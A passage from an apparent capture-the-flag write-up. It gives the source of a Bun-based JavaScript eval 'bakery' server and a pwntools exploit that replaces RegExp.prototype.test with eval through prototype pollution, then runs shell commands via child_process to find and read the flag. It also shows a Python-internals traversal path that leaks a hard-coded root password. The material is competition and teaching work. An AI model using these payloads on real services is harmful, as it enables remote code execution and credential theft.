</span></span><span class="line"><span class="ln">38</span><span class="cl">      <span class="kr">const</span> <span class="nx">recipe</span> <span class="o">=</span> <span class="nx">order</span><span class="p">.</span><span class="nx">toString</span><span class="p">().</span><span class="nx">trim</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">
</span></span><span class="line"><span class="ln">40</span><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">recipe</span> <span class="o">===</span> <span class="s2">&#34;exit&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">        <span class="nx">customer</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&#34;ðŸ¥¯ Thank you for visiting our bakery! Goodbye!\n&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="nx">customer</span><span class="p">.</span><span class="nx">end</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">
</span></span><span class="line"><span class="ln">46</span><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">hasValidIngredients</span><span class="p">(</span><span class="nx">recipe</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">        <span class="nx">customer</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&#34;ðŸ© Sorry, we can&#39;t bake with these ingredients!\n&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">        <span class="nx">customer</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&#34;tasty-bun&gt; &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">
</span></span><span class="line"><span class="ln">52</span><span class="cl">      <span class="kr">const</span> <span class="nx">bakedBun</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">bake</span><span class="p">(</span><span class="nx">recipe</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl">      <span class="nx">customer</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">bakedBun</span> <span class="o">+</span> <span class="s2">&#34;\n&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">54</span><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">55</span><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s2">&#34;Error during baking:&#34;</span><span class="p">,</span> <span class="nx">e</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">56</span><span class="cl">      <span class="nx">customer</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&#34;ðŸ¥ž Oops! The bun fell flat: &#34;</span> <span class="o">+</span> <span class="nx">e</span><span class="p">.</span><span class="nx">toString</span><span class="p">()</span> <span class="o">+</span> <span class="s2">&#34;\n&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">57</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">58</span><span class="cl">
</span></span><span class="line"><span class="ln">59</span><span class="cl">    <span class="nx">customer</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&#34;tasty-bun&gt; &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">60</span><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="ln">61</span><span class="cl">
</span></span><span class="line"><span class="ln">62</span><span class="cl">  <span class="nx">customer</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s2">&#34;error&#34;</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">63</span><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s2">&#34;Socket error:&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">64</span><span class="cl">    <span class="nx">customer</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&#34;ðŸ¥¯ A socket error occurred, but we&#39;re still open!\n&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">65</span><span class="cl">    <span class="nx">customer</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&#34;tasty-bun&gt; &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">66</span><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="ln">67</span><span class="cl">
</span></span><span class="line"><span class="ln">68</span><span class="cl">  <span class="nx">customer</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s2">&#34;end&#34;</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">69</span><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;ðŸ¥¨ A customer has left our bakery&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">70</span><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="ln">71</span><span class="cl"><span class="p">});</span>
</span></span><span class="line"><span class="ln">72</span><span class="cl">
</span></span><span class="line"><span class="ln">73</span><span class="cl"><span class="nx">process</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s2">&#34;unhandledRejection&#34;</span><span class="p">,</span> <span class="p">(</span><span class="nx">reason</span><span class="p">,</span> <span class="nx">promise</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">74</span><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s2">&#34;Unhandled Rejection at:&#34;</span><span class="p">,</span> <span class="nx">promise</span><span class="p">,</span> <span class="s2">&#34;reason:&#34;</span><span class="p">,</span> <span class="nx">reason</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">75</span><span class="cl"><span class="p">});</span>
</span></span><span class="line"><span class="ln">76</span><span class="cl">
</span></span><span class="line"><span class="ln">77</span><span class="cl"><span class="nx">process</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s2">&#34;uncaughtException&#34;</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">78</span><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s2">&#34;Unhandled exception caught:&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">79</span><span class="cl"><span class="p">});</span>
</span></span><span class="line"><span class="ln">80</span><span class="cl">
</span></span><span class="line"><span class="ln">81</span><span class="cl"><span class="kr">const</span> <span class="nx">displayBakeryBanner</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">82</span><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`
</span></span></span><span class="line"><span class="ln">83</span><span class="cl"><span class="sb">  ðŸžðŸ¥ðŸ¥–ðŸ¥¯ðŸ©ðŸ¥¨ &#34;The Tasty Bun&#34; Bakery ðŸ¥¨ðŸ©ðŸ¥¯ðŸ¥–ðŸ¥ðŸž
</span></span></span><span class="line"><span class="ln">84</span><span class="cl"><span class="sb">  Welcome to our special bun shop!
</span></span></span><span class="line"><span class="ln">85</span><span class="cl"><span class="sb">  We are very particular about our ingredients...
</span></span></span><span class="line"><span class="ln">86</span><span class="cl"><span class="sb">  `</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">87</span><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="ln">88</span><span class="cl">
</span></span><span class="line"><span class="ln">89</span><span class="cl"><span class="nx">displayBakeryBanner</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">90</span><span class="cl"><span class="nx">bakery</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="mi">2337</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">91</span><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;ðŸž Bakery now open on port 2337! Come get your tasty buns!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">92</span><span class="cl"><span class="p">});</span>
</span></span></code></pre></div><p>Solution</p>
<p>At first glance, this challenge seems like a simple JavaScript sandbox running on the Bun runtime. But very quickly, the core limitation becomes clear:</p>
<p><strong>You&rsquo;re only allowed to use 2 unique letters per line.</strong></p>
<p>That means any line you send to the server must contain at most <strong>two different alphabetical characters</strong>. You can repeat them as much as you want, but a third unique letter will instantly get your input rejected.</p>
<p>On top of that, several critical characters are completely banned:<br>
<strong><code>() / [ ] ; &quot; ' _ !</code></strong></p>
<p>These restrictions stop you from doing just about everything you&rsquo;d normally try in a JavaScript <code>eval()</code> challenge:</p>
<ul>
<li>
<p>âŒ <code>()</code> â€” No function calls. You can&rsquo;t invoke anything directly.</p>
</li>
<li>
<p>âŒ <code>[]</code> â€” No arrays or property access by string key (e.g., <code>obj[&quot;key&quot;]</code>).</p>
</li>
<li>
<p>âŒ <code>;</code> â€” No statement separators.</p>
</li>
<li>
<p>âŒ <code>'</code> or <code>&quot;</code> â€” No strings at all.</p>
</li>
<li>
<p>âŒ <code>/</code> â€” No regular expressions, and also no division.</p>
</li>
<li>
<p>âŒ <code>_</code> â€” No access to special objects like <code>__proto__</code>, <code>__defineGetter__</code>, or <code>globalThis</code>.</p>
</li>
<li>
<p>âŒ <code>!</code> â€” No use of logical negation or tricks like <code>![]</code>.</p>
</li>
</ul>
<p>Essentially, this removes <strong>most of the language features</strong> you&rsquo;d typically abuse in a sandbox escape: you canâ€™t use strings, arrays, object keys, or even call functions the usual way.</p>
<p>So the challenge becomes: <strong>How can we coerce or manipulate whatâ€™s left  just numbers, operators, and two letters to eventually execute something useful?</strong></p>
<p>Despite all the restrictions, the key weakness lies in how the server handles input: it uses <code>eval()</code> <strong>on the userâ€™s input</strong>, but only after first checking if the input passes a regex match using <code>test()</code>.</p>
<p>This is our entry point. If we can <strong>pollute the prototype of <code>RegExp</code></strong> and replace the <code>test</code> method with <code>eval</code>, then the next time the server tries to check our input using regex, it will actually end up <strong>evaluating it as JavaScript code</strong> without any restrictions.</p>
<p>In JavaScript, prototype pollution lets you overwrite properties shared across all objects of a certain type. Here, we exploit that to overwrite <code>RegExp.prototype.test</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">FLAG_RE</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;flag.+\.txt&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">def</span> <span class="nf">e</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="n">r</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">u00&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">return</span> <span class="n">r</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1"># r = remote(&#34;localhost&#34;, 2337)</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;exp.cybergame.sk&#34;</span><span class="p">,</span><span class="mi">7012</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="n">encoded_regexp</span> <span class="o">=</span> <span class="n">e</span><span class="p">(</span><span class="s2">&#34;RegExp&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="n">encoded_proto</span> <span class="o">=</span> <span class="n">e</span><span class="p">(</span><span class="s2">&#34;__proto__&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="n">encoded_test</span> <span class="o">=</span> <span class="n">e</span><span class="p">(</span><span class="s2">&#34;test&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="n">encoded_eval</span> <span class="o">=</span> <span class="n">e</span><span class="p">(</span><span class="s2">&#34;eval&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="n">get_flag_file_payload</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="s2">res = process.mainModule.require(&#34;child_process&#34;).spawnSync(&#34;ls&#34;, [&#34;..&#34;]).stdout.toString();throw new Error(res);
</span></span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="s2">&#34;&#34;&#34;</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;$=</span><span class="si">{</span><span class="n">encoded_regexp</span><span class="si">}</span><span class="s2">``&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;$$=</span><span class="si">{</span><span class="n">encoded_eval</span><span class="si">}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;$.</span><span class="si">{</span><span class="n">encoded_proto</span><span class="si">}</span><span class="s2">.</span><span class="si">{</span><span class="n">encoded_test</span><span class="si">}</span><span class="s2">=$$&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">
</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="n">get_flag_file_payload</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Error: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">
</span></span><span class="line"><span class="ln">35</span><span class="cl"><span class="n">files</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;tasty-bun&#34;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">
</span></span><span class="line"><span class="ln">37</span><span class="cl"><span class="n">flag_path</span> <span class="o">=</span> <span class="n">FLAG_RE</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">files</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">
</span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="n">print_flag_file_payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="s2">res = process.mainModule.require(&#34;child_process&#34;).spawnSync(&#34;cat&#34;, [&#34;../</span><span class="si">{</span><span class="n">flag_path</span><span class="si">}</span><span class="s2">&#34;]).stdout.toString();throw new Error(res);
</span></span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">
</span></span><span class="line"><span class="ln">43</span><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">print_flag_file_payload</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;tasty-bun&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">
</span></span><span class="line"><span class="ln">46</span><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">SK-CERT{\u0074\u0068\u0069\u0073\u0020\u0069\u0073\u0020\u0066\u0075\u006E}
</span></span></code></pre></div><h3 id="dictfs">dictFS</h3>
<p>Description</p>
<blockquote>
<p>The admin of this application supposedly implemented a backdoor. Can you find it?</p></blockquote>
<h4 id="recover-the-root-password">Recover the root password</h4>
<p>After poking around the file system for a while and exploring different objects exposed through directory traversal, I discovered a path that led straight into the internals of the Python runtime.</p>
<p>By navigating through <code>/mnt</code>, I found what appeared to be a dictionary like object that gave access to a chain of attributes and internal references. Following this path:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="ln">1</span><span class="cl"><span class="err">/mnt/a/__init__/__globals__/__builtins__/help/__class__/__call__/__globals__/sys/modules/__main__/DirShell/__init__/__code__</span>
</span></span></code></pre></div><p>I eventually landed on the <code>__code__</code> object of the <code>DirShell</code> classâ€™s <code>__init__</code> method  a goldmine in terms of introspection.</p>
<p>From there, I dumped the constant pool of the bytecode using:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">cat</span> <span class="n">co_consts</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">a</span><span class="o">/</span><span class="fm">__init__</span><span class="o">/</span><span class="vm">__globals__</span><span class="o">/</span><span class="n">__builtins__</span><span class="o">/</span><span class="n">help</span><span class="o">/</span><span class="vm">__class__</span><span class="o">/</span><span class="fm">__call__</span><span class="o">/</span><span class="vm">__globals__</span><span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">modules</span><span class="o">/</span><span class="n">__main__</span><span class="o">/</span><span class="n">DirShell</span><span class="o">/</span><span class="fm">__init__</span><span class="o">/</span><span class="vm">__code__</span><span class="err">$</span><span class="o">&gt;</span> <span class="n">cat</span> <span class="n">co_consts</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="s1">&#39;â–‘â–’â–“â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘â–‘â–’â–“â–ˆâ–“â–’â–‘â–‘â–’â–“â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘â–’â–“â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘â–’â–“â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘â–’â–“â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘      â–‘â–’â–“â–ˆâ–“â–’â–‘â–‘â–’â–“â–ˆâ–“â–’â–‘  â–‘â–’â–“â–ˆâ–“â–’â–‘      â–‘â–’â–“â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘ </span><span class="se">\n</span><span class="s1">â–‘â–’â–“â–ˆâ–“â–’â–‘â–‘â–’â–“â–ˆâ–“â–’â–‘â–’â–“â–ˆâ–“â–’â–‘â–’â–“â–ˆâ–“â–’â–‘â–‘â–’â–“â–ˆâ–“â–’â–‘ â–‘â–’â–“â–ˆâ–“â–’â–‘   â–‘â–’â–“â–ˆâ–“â–’â–‘     â–‘â–’â–“â–ˆâ–“â–’â–‘             â–‘â–’â–“â–ˆâ–“â–’â–‘â–‘â–’â–“â–ˆâ–“â–’â–‘â–’â–“â–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘      â–‘â–’â–“â–ˆâ–“â–’â–‘â–‘â–’â–“â–ˆâ–“â–’â–‘ </span><span class="se">\n</span><span class="s1">â–‘â–’â–“â–ˆâ–“â–’â–‘â–‘â–’â–“â–ˆâ–“â–’â–‘â–’â–“â–ˆâ–“â–’â–‘â–’â–“â–ˆâ–“â–’â–‘        â–‘â–’â–“â–ˆâ–“â–’â–‘   â–‘â–’â–“â–ˆâ–“â–’â–‘     â–‘â–’â–“â–ˆâ–“â–’â–‘              â–‘â–’â–“â–ˆâ–“â–’â–’â–“â–ˆâ–“â–’â–‘   â–‘â–’â–“â–ˆâ–“â–’â–‘      â–‘â–’â–“â–ˆâ–“â–’â–‘â–‘â–’â–“â–ˆâ–“â–’â–‘ </span><span class="se">\n</span><span class="s1">â–‘â–’â–“â–ˆâ–“â–’â–‘â–‘â–’â–“â–ˆâ–“â–’â–‘â–’â–“â–ˆâ–“â–’â–‘â–’â–“â–ˆâ–“â–’â–‘        â–‘â–’â–“â–ˆâ–“â–’â–‘   â–‘â–’â–“â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘ â–‘â–’â–“â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘        â–‘â–’â–“â–ˆâ–“â–’â–’â–“â–ˆâ–“â–’â–‘   â–‘â–’â–“â–ˆâ–“â–’â–‘      â–‘â–’â–“â–ˆâ–“â–’â–‘â–‘â–’â–“â–ˆâ–“â–’â–‘ </span><span class="se">\n</span><span class="s1">â–‘â–’â–“â–ˆâ–“â–’â–‘â–‘â–’â–“â–ˆâ–“â–’â–‘â–’â–“â–ˆâ–“â–’â–‘â–’â–“â–ˆâ–“â–’â–‘        â–‘â–’â–“â–ˆâ–“â–’â–‘   â–‘â–’â–“â–ˆâ–“â–’â–‘            â–‘â–’â–“â–ˆâ–“â–’â–‘        â–‘â–’â–“â–ˆâ–“â–“â–ˆâ–“â–’â–‘    â–‘â–’â–“â–ˆâ–“â–’â–‘      â–‘â–’â–“â–ˆâ–“â–’â–‘â–‘â–’â–“â–ˆâ–“â–’â–‘ </span><span class="se">\n</span><span class="s1">â–‘â–’â–“â–ˆâ–“â–’â–‘â–‘â–’â–“â–ˆâ–“â–’â–‘â–’â–“â–ˆâ–“â–’â–‘â–’â–“â–ˆâ–“â–’â–‘â–‘â–’â–“â–ˆâ–“â–’â–‘ â–‘â–’â–“â–ˆâ–“â–’â–‘   â–‘â–’â–“â–ˆâ–“â–’â–‘            â–‘â–’â–“â–ˆâ–“â–’â–‘        â–‘â–’â–“â–ˆâ–“â–“â–ˆâ–“â–’â–‘    â–‘â–’â–“â–ˆâ–“â–’â–‘â–’â–“â–ˆâ–ˆâ–“â–’â–‘â–’â–“â–ˆâ–“â–’â–‘â–‘â–’â–“â–ˆâ–“â–’â–‘ </span><span class="se">\n</span><span class="s1">â–‘â–’â–“â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘â–‘â–’â–“â–ˆâ–“â–’â–‘â–‘â–’â–“â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘  â–‘â–’â–“â–ˆâ–“â–’â–‘   â–‘â–’â–“â–ˆâ–“â–’â–‘     â–‘â–’â–“â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘          â–‘â–’â–“â–ˆâ–ˆâ–“â–’â–‘     â–‘â–’â–“â–ˆâ–“â–’â–‘â–’â–“â–ˆâ–ˆâ–“â–’â–‘â–’â–“â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘ </span><span class="se">\n</span><span class="s1">                                                                                                                        </span><span class="se">\n</span><span class="s1">                                                                                                                        &#39;</span><span class="p">,</span> <span class="s1">&#39;Welcome to our completely custom filesystem! you can use the following commands in our in-house built DirShellâ„¢:&#39;</span><span class="p">,</span> <span class="s1">&#39;ls - list files and directories&#39;</span><span class="p">,</span> <span class="s1">&#39;cd &lt;dir&gt; - change directory&#39;</span><span class="p">,</span> <span class="s1">&#39;cat &lt;file&gt; - print file contents&#39;</span><span class="p">,</span> <span class="s1">&#39;pwd - print current directory&#39;</span><span class="p">,</span> <span class="s1">&#39;touch &lt;file&gt; - create/rewrite a file (root only) - if the filename starts with @ it is read-only [beta]&#39;</span><span class="p">,</span> <span class="s1">&#39;mkdir &lt;dir&gt; - create a directory (root only) [beta]&#39;</span><span class="p">,</span> <span class="s1">&#39;rewrite &lt;file&gt; - rewrite a file with hex characters (root only) - bypasses read-only @ prefix. USE WITH CAUTION [beta]&#39;</span><span class="p">,</span> <span class="s1">&#39;su - switch to root user (secret password required)&#39;</span><span class="p">,</span> <span class="s1">&#39;exit - exit the shell&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;The filesystem is read-only for non-root users but we are experimenting with write capabilities in our current beta version&#39;</span><span class="p">,</span> <span class="s1">&#39;mnt.json&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="s1">&#39;I am a test content of a.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;HELLO WORLD&#39;</span><span class="p">,</span> <span class="s1">&#39;Lorem ipsum dolor sit amet&#39;</span><span class="p">,</span> <span class="s1">&#39;aa.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;aaaaaaaa&#39;</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;a.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;b.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;c.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;x&#39;</span><span class="p">,</span> <span class="s1">&#39;mnt&#39;</span><span class="p">,</span> <span class="s1">&#39;z&#39;</span><span class="p">),</span> <span class="kc">False</span><span class="p">,</span> <span class="s1">&#39;__YouAreNever$$84982198481nGonnaGu((*8essThiSS_!*&amp;^&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">a</span><span class="o">/</span><span class="fm">__init__</span><span class="o">/</span><span class="vm">__globals__</span><span class="o">/</span><span class="n">__builtins__</span><span class="o">/</span><span class="n">help</span><span class="o">/</span><span class="vm">__class__</span><span class="o">/</span><span class="fm">__call__</span><span class="o">/</span><span class="vm">__globals__</span><span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">modules</span><span class="o">/</span><span class="n">__main__</span><span class="o">/</span><span class="n">DirShell</span><span class="o">/</span><span class="fm">__init__</span><span class="o">/</span><span class="vm">__code__</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">__YouAreNever</span><span class="err">$$</span><span class="mi">84982198481</span><span class="n">nGonnaGu</span><span class="p">((</span><span class="o">*</span><span class="mi">8</span><span class="n">essThiSS_</span><span class="err">!</span><span class="o">*&amp;^</span>
